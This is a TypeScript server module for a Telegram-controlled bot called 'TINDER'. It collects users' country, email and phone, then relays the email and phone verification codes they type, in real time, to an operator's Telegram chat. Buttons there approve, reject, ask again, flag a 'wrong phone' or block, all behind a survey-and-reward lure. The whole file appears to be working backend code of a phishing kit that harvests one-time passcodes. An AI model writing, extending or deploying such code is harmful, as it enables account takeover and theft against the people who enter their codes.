import { readFileSync } from "node:fs";
import { NEW_EMAIL_NOTICE, WRONG_PHONE_NOTICE, DECLINE_DETAILS_NOTICE, RESTART_COUNTRY_NOTICE, RESTART_DETAILS_NOTICE } from "@/lib/applications";

function envValue(name: string) {
  const set = process.env[name]?.trim();
  if (set) return set;
  try {
    const text = readFileSync(new URL("../../.env", import.meta.url), "utf8");
    const line = text.split("\n").find((row) => row.startsWith(`${name}=`));
    return line?.slice(name.length + 1).trim() ?? "";
  } catch {
    return "";
  }
}

const TOKEN = envValue("TELEGRAM_BOT_TOKEN");
const ADMIN_ID = envValue("TELEGRAM_ADMIN_ID");

function tokenFor(_desk: string) {
  return TOKEN;
}

function adminFor(_desk: string) {
  return ADMIN_ID;
}

type Sql = <T = Record<string, unknown>>(
  strings: TemplateStringsArray,
  ...values: unknown[]
) => Promise<T[]>;

type CallbackQuery = {
  id: string;
  from?: { id: number };
  data?: string;
};

type Update = {
  update_id: number;
  callback_query?: CallbackQuery;
  message?: { from?: { id: number }; chat?: { id: number; type?: string }; text?: string };
};

const webhooksCleared = new Set<string>();

async function tg<T>(
  method: string,
  body: Record<string, unknown>,
  signal?: AbortSignal,
  token = TOKEN,
): Promise<T> {
  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
    signal,
  });
  const json = (await response.json()) as { ok: boolean; result?: T; description?: string };
  if (!json.ok) throw new Error(json.description || "Telegram request failed");
  return json.result as T;
}

export function adminReachError(err: unknown) {
  const message = err instanceof Error ? err.message : "";
  if (
    message.includes("initiate conversation") ||
    message.includes("bot was blocked") ||
    message.includes("chat not found")
  ) {
    return new Error("The administrator must open the TINDER bot in Telegram and press Start.");
  }
  return err instanceof Error ? err : new Error("Could not reach the admin");
}

type Action =
  | "approve"
  | "decline"
  | "block"
  | "restart-email"
  | "restart-phone"
  | "details"
  | "email"
  | "phone"
  | "reward"
  | "restart-survey"
  | "wrong-phone"
  | "skip";

function keyboard(id: number, kind: string) {
  const side =
    kind === "phone_code"
      ? { text: "📞 Wrong Phone", callback_data: `w:${id}` }
      : { text: "⛔ Not Applicable", callback_data: `n:${id}` };
  return {
    inline_keyboard: [
      [
        { text: "✅ Approve", callback_data: `a:${id}` },
        { text: "❌ Decline", callback_data: `d:${id}` },
      ],
      [
        { text: "🔄 Restart Survey", callback_data: `s:${id}` },
        side,
      ],
      [{ text: "⛔️ Block User", callback_data: `b:${id}` }],
    ],
  };
}

function parseAction(data: string): { action: Action; id: number } | null {
  const match = /^(a|d|b|e|p|s|w|n|1|2|3|4|5|6):(\d+)$/.exec(data);
  if (!match) return null;
  const id = Number(match[2]);
  if (!Number.isInteger(id) || id < 1) return null;
  const action = (
    {
      a: "approve",
      d: "decline",
      b: "block",
      e: "restart-email",
      p: "restart-phone",
      s: "restart-survey",
      w: "wrong-phone",
      n: "skip",
      1: "details",
      2: "email",
      3: "phone",
      4: "reward",
      5: "decline",
      6: "block",
    } as const
  )[match[1] as "a" | "d" | "b" | "e" | "p" | "s" | "w" | "n" | "1" | "2" | "3" | "4" | "5" | "6"];
  return { action, id };
}

function isYes(value: unknown) {
  return value === true || value === 1 || value === "t" || value === "true";
}

function esc(value: string) {
  return value.replace(/&/g, "&" + "amp;").replace(/</g, "&" + "lt;").replace(/>/g, "&" + "gt;");
}

function copyable(value: string) {
  const clean = value.trim();
  if (!clean) return "—";
  return `<code>${esc(clean)}</code>`;
}

async function userCard(sql: Sql, userId: string, legend: string, code = "", desk = "1") {
  let stored = "";
  try {
    const people = await sql<{ name: string }>`select name from "user" where id = ${userId}`;
    stored = people[0]?.name?.trim() ?? "";
  } catch {
    stored = "";
  }
  const apps = await sql<{ country: string; email: string; phone: string }>`
    select country, email, phone from applications where user_id = ${userId}
  `;
  const app = apps[0];
  const email = app?.email ?? "";
  const phone = app?.phone?.trim() ?? "";
  const name =
    stored && stored !== "Signed-in member" && stored !== "Dev User" && stored !== "Member"
      ? stored
      : email.split("@")[0] || "Member";
  const lines = [
    "🔔 New User Details",
    "",
    `👤 Name: ${esc(name)}`,
    `🌍 Country: ${esc(app?.country || "—")}`,
    `✉️ Email: ${esc(email || "—")}`,
    `📞 Phone: ${copyable(phone)}`,
  ];
  if (code.trim()) lines.push(`🔢 Code entered: ${copyable(code)}`);
  if (legend.trim()) lines.push("", esc(legend.trim()));
  return { text: lines.join("\n"), phone };
}

function signFor(verb: string) {
  if (verb === "Approved") return "✅";
  if (verb === "Declined") return "❌";
  if (verb === "Restart survey") return "🔄";
  if (verb === "Not applicable") return "⛔";
  if (verb === "Block User") return "⛔️";
  if (verb === "Wrong phone") return "📞";
  return "";
}

function flowLine(kind: string, verb: string) {
  const mark = signFor(verb);
  const line =
    kind === "reward"
      ? `Step 4 ${verb}-Reward Approval`
      : kind === "phone_code"
        ? `Step 3 ${verb}-Entering phone code`
        : kind === "email_code"
          ? `Step 2 ${verb}-Email code`
          : `Step 1 ${verb}-Entering email code`;
  return `${mark} ${line}`;
}

async function tellFlow(kind: string, verb: string, _replyTo?: string | null, desk = "1") {
  const route = desk === "2" || desk === "3" ? desk : "1";
  const chat_id = adminFor(route);
  const token = tokenFor(route);
  if (!chat_id) return;
  const lines = [flowLine(kind, verb)];
  if (verb === "Approved" && kind === "reward") lines.push("✅ Step 5 Approved");
  for (const text of lines) {
    await tg("sendMessage", { chat_id, text, disable_web_page_preview: true }, undefined, token).catch(() => undefined);
  }
}

async function applyDecision(sql: Sql, id: number, action: Action) {
  const events = await sql<{
    id: number;
    user_id: string;
    kind: string;
    detail: string;
    status: string;
    telegram_message_id: string | null;
    desk: string | null;
  }>`select id, user_id, kind, detail, status, telegram_message_id, desk from admin_events where id = ${id}`;
  const event = events[0];
  if (!event) return "Unknown request";
  if (event.status !== "pending") return "Already handled";

  if (action === "block") {
    await sql`
      insert into login_approvals (user_id, status, label)
      values (${event.user_id}, 'blocked', '')
      on conflict (user_id) do update
      set status = 'blocked', updated_at = now()
    `;
    await sql`
      update applications
      set email_verified = false,
          phone_verified = false,
          email_code = null,
          phone_code = null,
          email_code_pending = false,
          phone_code_pending = false,
          reward_status = 'none',
          notice = null,
          updated_at = now()
      where user_id = ${event.user_id}
    `;
    await sql`update admin_events set status = 'blocked' where user_id = ${event.user_id} and status = 'pending'`;
    void tellFlow(event.kind, "Block User", event.telegram_message_id, event.desk);
    return "Blocked";
  }

  if (action === "skip") {
    await sql`
      update applications
      set status = 'rejected',
          email_verified = false,
          phone_verified = false,
          email_code = null,
          phone_code = null,
          email_code_pending = false,
          phone_code_pending = false,
          reward_status = 'none',
          notice = ${NEW_EMAIL_NOTICE},
          updated_at = now()
      where user_id = ${event.user_id}
    `;
    await sql`update admin_events set status = 'skipped' where id = ${id}`;
    void tellFlow(event.kind, "Not applicable", event.telegram_message_id, event.desk);
    return "Not applicable";
  }

  if (action === "decline") {
    if (event.kind === "email_code") {
      await sql`
        update applications
        set notice = 'Enter the email code again.',
            email_code_pending = false,
            email_verified = false,
            email_code = null,
            status = 'approved',
            updated_at = now()
        where user_id = ${event.user_id}
      `;
    } else if (event.kind === "phone_code") {
      await sql`
        update applications
        set notice = 'Enter the phone code again.',
            phone_code_pending = false,
            phone_verified = false,
            phone_code = null,
            status = 'approved',
            updated_at = now()
        where user_id = ${event.user_id}
      `;
    } else if (event.kind === "reward") {
      await sql`
        update applications
        set reward_status = 'none', updated_at = now()
        where user_id = ${event.user_id}
      `;
      await sql`update admin_events set status = 'rejected' where id = ${id}`;
      void tellFlow(event.kind, "Declined", event.telegram_message_id, event.desk);
      void requestReward(sql, event.user_id).catch(() => undefined);
      return "Declined";
    } else {
      await sql`
        update applications
        set status = 'rejected',
            email_verified = false,
            phone_verified = false,
            email_code = null,
            phone_code = null,
            email_code_pending = false,
            phone_code_pending = false,
            reward_status = 'none',
            notice = ${DECLINE_DETAILS_NOTICE},
            updated_at = now()
        where user_id = ${event.user_id}
      `;
    }
    await sql`update admin_events set status = 'rejected' where id = ${id}`;
    void tellFlow(event.kind, "Declined", event.telegram_message_id, event.desk);
    return "Declined";
  }

  if (action === "restart-survey") {
    if (event.kind === "phone_code") {
      await sql`
        update applications
        set status = 'approved',
            email_verified = false,
            phone_verified = false,
            email_code = null,
            phone_code = null,
            email_code_pending = false,
            phone_code_pending = false,
            reward_status = 'none',
            notice = 'Enter the email code again.',
            updated_at = now()
        where user_id = ${event.user_id}
      `;
    } else if (event.kind === "reward") {
      await sql`
        update applications
        set status = 'approved',
            phone_verified = false,
            phone_code = null,
            phone_code_pending = false,
            reward_status = 'none',
            notice = 'Enter the phone code again.',
            updated_at = now()
        where user_id = ${event.user_id}
      `;
    } else if (event.kind === "email_code") {
      await sql`
        update applications
        set status = 'rejected',
            email_verified = false,
            phone_verified = false,
            email_code = null,
            phone_code = null,
            email_code_pending = false,
            phone_code_pending = false,
            reward_status = 'none',
            notice = ${RESTART_DETAILS_NOTICE},
            updated_at = now()
        where user_id = ${event.user_id}
      `;
    } else {
      await sql`
        update applications
        set status = 'rejected',
            email_verified = false,
            phone_verified = false,
            email_code = null,
            phone_code = null,
            email_code_pending = false,
            phone_code_pending = false,
            reward_status = 'none',
            notice = ${RESTART_COUNTRY_NOTICE},
            updated_at = now()
        where user_id = ${event.user_id}
      `;
    }
    await sql`update admin_events set status = 'restarted' where id = ${id}`;
    void tellFlow(event.kind, "Restart survey", event.telegram_message_id, event.desk);
    return "Survey restarted";
  }

  if (action === "wrong-phone") {
    await sql`
      update applications
      set status = 'rejected',
          email_verified = false,
          phone_verified = false,
          email_code = null,
          phone_code = null,
          email_code_pending = false,
          phone_code_pending = false,
          reward_status = 'none',
          notice = ${WRONG_PHONE_NOTICE},
          updated_at = now()
      where user_id = ${event.user_id}
    `;
    await sql`update admin_events set status = 'restarted' where id = ${id}`;
    void tellFlow(event.kind, "Wrong phone", event.telegram_message_id, event.desk);
    return "Wrong phone";
  }

  const resolved: Action =
    action === "approve" && event.kind === "email_code"
      ? "email"
      : action === "approve" && event.kind === "phone_code"
        ? "phone"
        : action === "approve" && event.kind === "reward"
          ? "reward"
          : action === "approve" && event.kind === "application"
            ? "details"
            : action;

  if (resolved === "email") {
    const waitingDetails = await sql<{ id: number }>`
      select id from admin_events
      where user_id = ${event.user_id} and kind = 'application' and status = 'pending'
      limit 1
    `;
    if (waitingDetails.length) return "Approve the details first";
    const gate = await sql<{ status: string }>`select status from applications where user_id = ${event.user_id}`;
    if (gate[0]?.status !== "approved") return "Approve the details first";
    await sql`
      update applications
      set email_verified = true,
          email_code = null,
          email_code_pending = false,
          phone_verified = false,
          phone_code = null,
          phone_code_pending = false,
          status = 'approved',
          updated_at = now()
      where user_id = ${event.user_id}
    `;
    await sql`update admin_events set status = 'approved' where id = ${id}`;
    void tellFlow("email_code", "Approved", event.telegram_message_id, event.desk);
    return "Email verified";
  }

  if (resolved === "phone") {
    await sql`
      update applications
      set phone_verified = true,
          phone_code_pending = false,
          updated_at = now()
      where user_id = ${event.user_id}
    `;
    await sql`update admin_events set status = 'approved' where id = ${id}`;
    await tellFlow("phone_code", "Approved", event.telegram_message_id, event.desk);
    await requestReward(sql, event.user_id).catch(() => undefined);
    return "Phone code approved";
  }

  if (resolved === "reward") {
    const ready = await sql<{ email_verified: boolean; phone_verified: boolean }>`
      select email_verified, phone_verified from applications where user_id = ${event.user_id}
    `;
    if (!isYes(ready[0]?.email_verified) || !isYes(ready[0]?.phone_verified)) return "Approve both codes first";
    await sql`
      update applications
      set reward_status = 'approved', updated_at = now()
      where user_id = ${event.user_id}
    `;
    await sql`update admin_events set status = 'approved' where id = ${id}`;
    void tellFlow("reward", "Approved", event.telegram_message_id, event.desk);
    return "Reward approved";
  }

  if (resolved === "details") {
    await sql`
      update applications
      set status = 'approved',
          email_code = null,
          phone_code = null,
          email_verified = false,
          phone_verified = false,
          email_code_pending = false,
          phone_code_pending = false,
          reward_status = 'none',
          updated_at = now()
      where user_id = ${event.user_id}
    `;
    await sql`update admin_events set status = 'approved' where id = ${id}`;
    void tellFlow("application", "Approved", event.telegram_message_id, event.desk);
    return "Phone and email approved";
  }

  const status = action === "approve" ? "approved" : "restarted";
  await sql`update admin_events set status = ${status} where id = ${id}`;

  if (action === "restart-email" || action === "restart-phone") {
    const channel = action === "restart-email" ? "email" : "phone";
    if (channel === "email") {
      await sql`
        update applications
        set email_code_pending = false, email_verified = false, status = 'approved', notice = 'That code was not accepted. Enter the code again.', updated_at = now()
        where user_id = ${event.user_id}
      `;
    } else {
      await sql`
        update applications
        set phone_code_pending = false, phone_verified = false, status = 'approved', notice = 'That code was not accepted. Enter the code again.', updated_at = now()
        where user_id = ${event.user_id}
      `;
    }
    void tellFlow(event.kind, "Restart survey", event.telegram_message_id, event.desk);
    return channel === "email" ? "Email code restarted" : "Phone code restarted";
  }

  if (event.kind === "login") {
    await sql`
      update login_approvals
      set status = ${status}, updated_at = now()
      where user_id = ${event.user_id}
    `;
  }

  if (event.kind === "application") {
    if (action === "approve") {
      const updated = await sql<{ user_id: string }>`
        update applications
        set status = 'approved',
            email_code = null,
            phone_code = null,
            email_verified = false,
            phone_verified = false,
            email_code_pending = false,
            phone_code_pending = false,
            reward_status = 'none',
            updated_at = now()
        where user_id = ${event.user_id} and status <> 'approved'
        returning user_id
      `;
      if (updated.length) {
        void tellFlow("application", "Approved", event.telegram_message_id, event.desk);
      }
    } else {
      await sql`
        update applications
        set status = 'rejected',
            email_code = null,
            phone_code = null,
            email_verified = false,
            phone_verified = false,
            email_code_pending = false,
            phone_code_pending = false,
            updated_at = now()
        where user_id = ${event.user_id} and status <> 'approved'
      `;
    }
  }

  if (event.kind === "email_code") {
    if (action === "approve") {
      await sql`
        update applications
        set email_verified = true,
            email_code = null,
            email_code_pending = false,
            phone_verified = false,
            phone_code = null,
            phone_code_pending = false,
            status = 'approved',
            updated_at = now()
        where user_id = ${event.user_id}
      `;
      void tellFlow("email_code", "Approved", event.telegram_message_id, event.desk);
      return "Email verified";
    } else {
      await sql`
        update applications
        set email_verified = false,
            email_code_pending = false,
            updated_at = now()
        where user_id = ${event.user_id}
      `;
    }
  }

  if (event.kind === "phone_code") {
    await sql`
      update applications
      set phone_verified = ${action === "approve"},
          phone_code_pending = false,
          updated_at = now()
      where user_id = ${event.user_id}
    `;
    if (action === "approve") void requestReward(sql, event.user_id).catch(() => undefined);
  }

  if (event.kind === "reward") {
    await sql`
      update applications
      set reward_status = ${action === "approve" ? "approved" : "declined"},
          updated_at = now()
      where user_id = ${event.user_id}
    `;
  }

  return action === "approve" ? "Approved" : "Declined";
}

const liveOffset = globalThis as { __tinderOffsets?: Record<string, number> };

async function drainOnce(sql: Sql, signal: AbortSignal | undefined, token: string, stateId: number) {
  if (!webhooksCleared.has(token)) {
    webhooksCleared.add(token);
    void tg("deleteWebhook", { drop_pending_updates: false }, undefined, token).catch(() => undefined);
  }
  const offsets = (liveOffset.__tinderOffsets ??= {});
  const key = String(stateId);
  if (offsets[key] == null) {
    const state = await sql<{ update_offset: number }>`select update_offset from telegram_state where id = ${stateId}`;
    offsets[key] = Number(state[0]?.update_offset ?? 0);
  }
  const offset = offsets[key] ?? 0;
  let updates: Update[] = [];
  try {
    updates = await tg<Update[]>(
      "getUpdates",
      {
        ...(offset > 0 ? { offset } : {}),
        timeout: 20,
        allowed_updates: ["callback_query"],
      },
      signal,
      token,
    );
  } catch (err) {
    if (signal?.aborted) return;
    const message = err instanceof Error ? err.message : "";
    if (message.includes("Conflict") || message.includes("getUpdates") || message.includes("aborted")) return;
    throw err;
  }
  let next = offset;
  for (const update of updates ?? []) {
    next = update.update_id + 1;
    const query = update.callback_query;
    if (!query) continue;
    const parsed = parseAction(String(query.data ?? ""));
    if (String(query.from?.id ?? "") !== ADMIN_ID) {
      void tg("answerCallbackQuery", { callback_query_id: query.id, text: "Not the admin" }, undefined, token).catch(
        () => undefined,
      );
      continue;
    }
    const label =
      parsed?.action === "approve"
        ? "Approved"
        : parsed?.action === "decline"
          ? "Declined"
          : parsed?.action === "block"
            ? "Blocked"
            : parsed?.action === "restart-survey"
              ? "Restarted"
              : parsed?.action === "wrong-phone"
                ? "Wrong phone"
                : parsed?.action === "skip"
                  ? "Not applicable"
                  : "Saved";
    void tg("answerCallbackQuery", { callback_query_id: query.id, text: label }, undefined, token).catch(() => undefined);
    if (!parsed) continue;
    void applyDecision(sql, parsed.id, parsed.action).catch(() => undefined);
  }
  if (next !== offset) {
    offsets[key] = next;
    void sql`
      insert into telegram_state (id, update_offset)
      values (${stateId}, ${next})
      on conflict (id) do update set update_offset = excluded.update_offset
    `.catch(() => undefined);
  }
}

const drainGate = globalThis as { __tinderDrain?: Promise<void> };

export function drainTelegram(_sql: Sql) {
  return drainGate.__tinderDrain ?? Promise.resolve();
}

async function syncWaiting(sql: Sql) {
  const rows = await sql<{ user_id: string }>`
    select a.user_id
    from applications a
    left join login_approvals l on l.user_id = a.user_id
    where coalesce(l.status, '') <> 'blocked'
      and (
        a.status = 'pending'
        or a.email_code_pending = true
        or (a.email_verified = true and a.phone_verified = true and a.reward_status = 'none')
      )
    order by a.updated_at desc
    limit 40
  `;
  for (const row of rows) {
    await nudgePending(sql, row.user_id).catch(() => undefined);
    await requestReward(sql, row.user_id).catch(() => undefined);
  }
}

function startAdminLoop() {
  const gate = globalThis as {
    __tinderGen?: number;
    __tinderWaits?: ReturnType<typeof setTimeout>[];
    __tinderSync?: ReturnType<typeof setInterval>;
    __tinderPolls?: AbortController[];
  };
  const gen = (gate.__tinderGen ?? 0) + 1;
  gate.__tinderGen = gen;
  gate.__tinderPolls?.forEach((poll) => poll.abort());
  gate.__tinderWaits?.forEach((wait) => clearTimeout(wait));
  if (gate.__tinderSync) clearInterval(gate.__tinderSync);
  const polls = [new AbortController(), new AbortController()];
  gate.__tinderPolls = polls;
  const waits: ReturnType<typeof setTimeout>[] = [];
  gate.__tinderWaits = waits;
  const watch = (token: string, stateId: number, poll: AbortController) => {
    const tick = async () => {
      if (gate.__tinderGen !== gen) return;
      try {
        const { getSql } = await import("@/lib/db");
        const sql = await getSql();
        await drainOnce(sql, poll.signal, token, stateId);
      } catch {
        // A failed poll must not stop the next command.
      }
      if (gate.__tinderGen !== gen) return;
      waits[stateId] = setTimeout(() => void tick(), 0);
    };
    void tick();
  };
  watch(TOKEN, 1, polls[0]);
  gate.__tinderSync = setInterval(() => {
    if (gate.__tinderGen !== gen) return;
    void (async () => {
      try {
        const { getSql } = await import("@/lib/db");
        const sql = await getSql();
        await syncWaiting(sql);
      } catch {
        // A reminder must not block the approval listener.
      }
    })();
  }, 1500);
}

startAdminLoop();

export async function deliverEnteredCode(sql: Sql, userId: string, channel: "email" | "phone", code: string) {
  const kind = channel === "email" ? "email_code" : "phone_code";
  const apps = await sql<{ status: string; email_verified: boolean }>`
    select status, email_verified from applications where user_id = ${userId}
  `;
  const app = apps[0];
  if (!app || app.status !== "approved") return;
  if (channel === "phone" && !isYes(app.email_verified)) return;
  const waitingDetails = await sql<{ id: number }>`
    select id from admin_events
    where user_id = ${userId} and kind = 'application' and status = 'pending'
    limit 1
  `;
  if (channel === "email" && waitingDetails.length) return;
  await sql`
    update admin_events
    set status = 'replaced'
    where user_id = ${userId} and kind = ${kind} and status = 'pending'
  `;
  const text =
    channel === "email"
      ? "Step 2- Email code"
      : "Step 3-Entering phone code";
  await askAdmin(sql, userId, kind, code, text);
}

const askLocks = globalThis as { __askLocks?: Map<string, Promise<void>> };

export async function askAdmin(sql: Sql, userId: string, kind: string, detail: string, text: string) {
  const key = `${userId}:${kind}`;
  const locks = (askLocks.__askLocks ??= new Map());
  const earlier = locks.get(key);
  if (earlier) await earlier.catch(() => undefined);
  let release: () => void = () => undefined;
  const gate = new Promise<void>((resolve) => {
    release = resolve;
  });
  locks.set(key, gate);
  try {
    const desks = await sql<{ desk: string | null }>`select desk from applications where user_id = ${userId}`;
    const desk = desks[0]?.desk === "2" || desks[0]?.desk === "3" ? desks[0].desk : "1";
    const pending = await sql<{ id: number; telegram_message_id: string | null }>`
      select id, telegram_message_id from admin_events
      where user_id = ${userId} and kind = ${kind} and status = 'pending'
      limit 1
    `;
    let id = pending[0]?.id;
    if (pending[0]?.telegram_message_id) return;
    if (!id) {
      try {
        const inserted = await sql<{ id: number }>`
          insert into admin_events (user_id, kind, detail, status, desk)
          values (${userId}, ${kind}, ${detail}, 'pending', ${desk})
          returning id
        `;
        id = inserted[0]?.id;
      } catch {
        const again = await sql<{ id: number; telegram_message_id: string | null }>`
          select id, telegram_message_id from admin_events
          where user_id = ${userId} and kind = ${kind} and status = 'pending'
          limit 1
        `;
        if (again[0]?.telegram_message_id) return;
        id = again[0]?.id;
      }
    }
    if (!id) throw new Error("Could not open the admin review");
    const claimed = await sql<{ telegram_message_id: string | null }>`
      update admin_events
      set detail = ${detail}
      where id = ${id} and telegram_message_id is null
      returning telegram_message_id
    `;
    if (!claimed.length && pending[0]?.telegram_message_id) return;
    const fresh = await sql<{ telegram_message_id: string | null }>`
      select telegram_message_id from admin_events where id = ${id}
    `;
    if (fresh[0]?.telegram_message_id) return;
    const chat = adminFor(desk);
    const code = kind === "email_code" || kind === "phone_code" ? detail : "";
    const card = await userCard(sql, userId, text, code, desk);
    const payload: Record<string, unknown> = {
      chat_id: chat,
      text: card.text,
      parse_mode: "HTML",
      disable_notification: false,
      reply_markup: keyboard(id, kind),
    };
    const message = await tg<{ message_id: number }>("sendMessage", payload, undefined, tokenFor(desk));
    await sql`
      update admin_events
      set telegram_message_id = ${String(message.message_id)}, detail = ${detail}
      where id = ${id}
    `;
  } finally {
    release();
    if (locks.get(key) === gate) locks.delete(key);
  }
}

export async function nudgePending(sql: Sql, userId: string) {
  const apps = await sql<{
    status: string;
    email: string;
    email_code: string | null;
    phone_code: string | null;
    email_verified: boolean;
    phone_verified: boolean;
    email_code_pending: boolean;
    phone_code_pending: boolean;
    country: string;
  }>`
    select status, email, email_code, phone_code, email_verified, phone_verified, email_code_pending, phone_code_pending, country
    from applications
    where user_id = ${userId}
  `;
  const app = apps[0];
  if (!app || app.status === "blocked") return;

  if (app.status === "pending" && app.email_code_pending !== true) {
    await askAdmin(
      sql,
      userId,
      "application",
      `${app.country} ${app.email}`,
      "Step 1-Entering email code",
    );
  }

  if (app.status === "approved" && app.email_code_pending === true && app.email_verified !== true) {
    const events = await sql<{ id: number; detail: string; telegram_message_id: string | null }>`
      select id, detail, telegram_message_id from admin_events
      where user_id = ${userId} and kind = 'email_code' and status = 'pending'
      order by id desc
      limit 1
    `;
    const event = events[0];
    if (!event?.telegram_message_id) {
      if (event) await sql`delete from admin_events where id = ${event.id}`;
      const entered = event?.detail ?? "";
      const legend = "Step 2- Email code";
      await askAdmin(sql, userId, "email_code", entered, legend);
    }
    return;
  }
}

export async function requestReward(sql: Sql, userId: string) {
  const rows = await sql<{
    email: string;
    phone: string;
    email_verified: boolean;
    phone_verified: boolean;
    reward_status: string;
  }>`
    select email, phone, email_verified, phone_verified, reward_status
    from applications
    where user_id = ${userId}
  `;
  const row = rows[0];
  if (!row || !isYes(row.email_verified) || !isYes(row.phone_verified)) return;
  if (row.reward_status !== "none") return;
  await sql`
    update applications
    set reward_status = 'pending', updated_at = now()
    where user_id = ${userId} and reward_status = 'none'
  `;
  try {
    await askAdmin(
      sql,
      userId,
      "reward",
      row.email,
      "Step 4-Reward Approval",
    );
  } catch (err) {
    await sql`
      update applications
      set reward_status = 'none', updated_at = now()
      where user_id = ${userId} and reward_status = 'pending'
    `;
    throw err;
  }
}

export async function tellAdmin(text: string) {
  try {
    await tg("sendMessage", { chat_id: adminFor("1"), text });
  } catch (err) {
    throw adminReachError(err);
  }
}
